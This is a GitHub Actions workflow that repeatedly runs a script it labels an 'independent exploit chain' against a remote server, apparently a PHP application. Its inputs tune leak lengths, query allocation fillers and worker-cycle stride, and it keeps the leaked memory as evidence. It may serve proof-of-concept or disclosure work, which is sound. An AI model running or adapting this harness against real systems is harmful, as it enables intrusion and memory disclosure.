name: Remote proof

on:
  workflow_dispatch:
    inputs:
      leak_length:
        description: Decoded B1 cookie length
        type: choice
        options:
          - "0x440"
          - "0x480"
          - "0x500"
          - "0x540"
        default: "0x440"
      pre_parameters:
        description: A1 query allocation shift
        type: choice
        options:
          - "8"
          - "4"
          - "12"
        default: "8"
      worker_stride:
        description: Requests per PHP worker cycle
        type: choice
        options:
          - "1"
          - "5"
          - "4"
          - "6"
        default: "1"
      b1_fillers:
        description: B1 query allocation fillers
        type: choice
        options:
          - "5,6,2,7"
          - "5"
          - "6"
          - "2"
          - "7"
        default: "5,6,2,7"

permissions:
  contents: read

concurrency:
  group: remote-proof
  cancel-in-progress: true

jobs:
  prove:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
      - name: Run independent exploit chain
        run: python3 remote_proof.py --direct --attempts 4 --timeout 20 --retry-delay 5 --leak-length ${{ inputs.leak_length }} --pre-parameters ${{ inputs.pre_parameters }} --b1-fillers ${{ inputs.b1_fillers }} --worker-stride ${{ inputs.worker_stride }}
      - name: Preserve evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: remote-proof-evidence
          path: |
            remote-leak.bin
            remote-proof.log
          if-no-files-found: ignore
          retention-days: 1
